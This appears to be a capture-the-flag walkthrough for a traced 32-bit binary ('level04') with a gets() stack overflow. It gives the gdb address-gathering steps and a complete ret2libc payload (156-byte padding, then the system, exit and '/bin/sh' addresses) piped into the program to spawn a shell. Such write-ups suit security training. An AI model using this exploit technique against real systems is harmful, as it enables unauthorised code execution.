Level 4 - Walkthrough
========================

1) Recon
- Target binary: /home/users/level04/level04
- Key behavior observed:
	- Child process reads user-controlled input with gets().
	- Parent process traces child and checks syscall number.
	- Parent kills child when syscall == 11 (execve).

Useful commands:
- objdump -d ./level04
- gdb ./level04


2) Vulnerability confirmation
- Vulnerable line/path:
	- Child branch calls gets(user_buffer) where user_buffer is fixed-size stack buffer.
- Why exploitable:
	- gets() allows overflow into saved EIP.
	- Computed overwrite offset to EIP is 156 bytes.


3) Exploitation steps (ret2libc)

Step A - Gather runtime addresses in gdb:
	gdb ./level04
	set follow-fork-mode child
	b main
	run
	p system
	p exit
	info proc mappings
	find 0xf7e2c000, 0xf7fcc000, "/bin/sh"

Example values used:
- system = 0xf7e6aed0
- exit   = 0xf7e5eb70
- /bin/sh = 0xf7f897ec

Step B - Build and send payload:
	(python -c 'import struct,sys; sys.stdout.write("A"*156 + struct.pack("<I",0xf7e6aed0) + struct.pack("<I",0xf7e5eb70) + struct.pack("<I",0xf7f897ec) + "\n")'; cat) | ./level04

Payload layout:
- "A" * 156            -> reach saved EIP
- packed system addr   -> overwrite EIP
- packed exit addr     -> return target after system
- packed "/bin/sh" ptr -> argument to system


